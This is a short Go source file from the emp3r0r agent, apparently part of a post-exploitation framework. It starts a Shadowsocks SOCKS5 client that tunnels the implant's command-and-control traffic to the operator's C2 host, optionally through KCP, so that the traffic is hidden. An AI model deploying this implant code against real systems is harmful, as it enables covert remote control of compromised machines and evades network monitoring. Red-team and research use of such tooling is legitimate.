package agent

import (
	"context"
	"fmt"
	"log"
	"time"

	"github.com/jm33-m0/emp3r0r/core/lib/ss"
)

var SS_Ctx, SS_Cancel = context.WithCancel(context.Background())

// Start ShadowsocksC2Client client, you get a SOCKS5 proxy server at *:Runtime.ShadowsocksPort
// This proxy server is responsible for encapsulating C2 traffic
func ShadowsocksC2Client() {
	ss_server_port := RuntimeConfig.ShadowsocksPort
	ss_server_addr := RuntimeConfig.CCHost
	if RuntimeConfig.UseKCP {
		log.Print("C2 traffic will go through Shadowsocks, which will go through KCP")
		ss_server_port = RuntimeConfig.KCPPort
		ss_server_addr = "127.0.0.1"
	} else {
		log.Printf("C2 traffic will go through Shadowsocks: %s:%s",
			RuntimeConfig.CCHost,
			RuntimeConfig.ShadowsocksPort)
	}

	server_addr := fmt.Sprintf("%s:%s", ss_server_addr, ss_server_port)
	local_socks_addr := "127.0.0.1:" + RuntimeConfig.ShadowsocksPort

	// start ss
	var ss_config = &ss.SSConfig{
		ServerAddr:     server_addr,
		LocalSocksAddr: local_socks_addr,
		Cipher:         ss.AEADCipher,
		Password:       RuntimeConfig.Password,
		IsServer:       false,
		Verbose:        false,
		Ctx:            SS_Ctx,
		Cancel:         SS_Cancel,
	}
	err := ss.SSMain(ss_config)
	if err != nil {
		log.Fatalf("ShadowsocksProxy failed to start: %v", err)
	}

	defer func() {
		log.Print("ShadowsocksC2Client exited")
		ss_config.Cancel()
	}()

	for ss_config.Ctx.Err() == nil {
		time.Sleep(time.Second)
	}
}
